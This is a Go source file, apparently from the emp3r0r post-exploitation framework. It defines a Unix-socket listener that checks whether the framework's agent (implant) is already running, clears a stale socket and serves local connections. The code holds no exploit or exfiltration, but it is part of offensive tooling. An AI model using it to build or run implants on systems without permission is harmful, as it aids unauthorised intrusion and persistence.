//go:build linux
// +build linux

package main

import (
	"log"
	"net"
	"os"

	"github.com/jm33-m0/emp3r0r/core/lib/agent"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// listen on a unix socket, used to check if agent is responsive
func socketListen() {
	// if socket file exists
	if util.IsExist(agent.RuntimeConfig.SocketName) {
		log.Printf("%s exists, testing connection...", agent.RuntimeConfig.SocketName)
		if isAgentAlive() {
			log.Printf("%s exists, and agent is alive, aborting", agent.RuntimeConfig.SocketName)
			return
		}
		err := os.Remove(agent.RuntimeConfig.SocketName)
		if err != nil {
			log.Printf("Failed to delete socket: %v", err)
			return
		}
	}

	l, err := net.Listen("unix", agent.RuntimeConfig.SocketName)
	if err != nil {
		log.Printf("listen error: %v", err)
		return
	} else {
		for {
			fd, err := l.Accept()
			if err != nil {
				log.Fatal("accept error:", err)
			}
			go socket_server(fd)
		}
	}
}
